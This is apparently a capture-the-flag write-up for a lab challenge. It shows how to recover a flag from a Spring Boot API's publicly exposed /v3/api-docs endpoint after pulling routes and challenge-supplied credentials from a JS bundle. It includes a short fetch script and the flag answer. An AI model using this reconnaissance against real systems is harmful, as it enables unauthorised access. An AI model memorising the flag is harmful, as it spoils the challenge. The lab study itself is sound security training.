# They Lie To You — Chapter 1: Exploration


## Challenge description

**Points:** 2

```
Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!
```

## Summary

A React/Vite SPA (`theylietoyou.tcc`) backed by a Spring Boot REST API (`api.theylietoyou.tcc`) hosts a fake "disinformation" news site. The API exposes an undocumented-to-the-frontend but publicly reachable Spring `springdoc-openapi` endpoint at `/v3/api-docs`. The `TokenResponse` schema's `description` field leaks the flag directly in plaintext, along with a pointer to a second "untraceable-dev" environment that mirrors the same vulnerability.

## Solution

### Step 1: Recon the SPA and its API

Resolved `theylietoyou.tcc` (CTF-provided custom TLD) and fetched the page — a Vite/React MUI app. Pulling the built JS bundle (`/assets/index-*.js`) revealed the API base URL (`http://api.theylietoyou.tcc`), all frontend-called routes (`/api/auth/login`, `/api/profile`, `/api/news/*`, `/api/dashboard`, `/api/admin/*`), and the in-app "Case File" story text with provided investigator credentials:

```
Username: newWarrior
Password: chAng3melaTer123
```

Logging in returned a JWT with `role: AUTHOR` — confirmed via `/api/admin/users`, `/api/admin/flag`, etc. that admin-only routes are properly enforced (403) for this low-privilege account, so the bug isn't a trivial missing-authz check on those routes.

### Step 2: Find the exposed OpenAPI spec

Spring Boot apps built with `springdoc-openapi` commonly expose `/v3/api-docs` by default even when the Swagger UI itself is hidden behind the SPA's catch-all route. Requesting it directly (no auth) returned the full API schema — including routes never referenced by the frontend (`/api/admin/impersonate/{userId}`, `/api/admin/users/{userId}/meta/{metaId}`, `/api/admin/conf`). The `TokenResponse` component's `description` field contains the flag verbatim:

```json
"TokenResponse": {
  "description": "JWT access token returned after successful authentication.\nThis JWT is also very important for our DEV environment (untraceable-dev.theylietoyou.tcc)!\nFLAG{McUs-Wrjs-8MbE-SiIt}\n",
  ...
}
```

The same spec (and flag) is also served from the referenced dev mirror at `http://untraceable-dev-api.theylietoyou.tcc/v3/api-docs`.

```python
#!/usr/bin/env python3
"""Solve: They Lie To You — flag leaked in exposed Spring OpenAPI docs."""
import json
import re
import urllib.request

API_DOCS_URLS = [
    "http://api.theylietoyou.tcc/v3/api-docs",
    "http://untraceable-dev-api.theylietoyou.tcc/v3/api-docs",
]

FLAG_RE = re.compile(r"FLAG\{[^}]+\}")

for url in API_DOCS_URLS:
    with urllib.request.urlopen(url, timeout=10) as resp:
        spec = json.loads(resp.read().decode("utf-8"))

    token_desc = spec["components"]["schemas"]["TokenResponse"]["description"]
    match = FLAG_RE.search(token_desc)
    if match:
        print(f"[{url}] {match.group(0)}")
```

Output:

```
[http://api.theylietoyou.tcc/v3/api-docs] FLAG{McUs-Wrjs-8MbE-SiIt}
[http://untraceable-dev-api.theylietoyou.tcc/v3/api-docs] FLAG{McUs-Wrjs-8MbE-SiIt}
```

## Flag

```
FLAG{McUs-Wrjs-8MbE-SiIt}
```
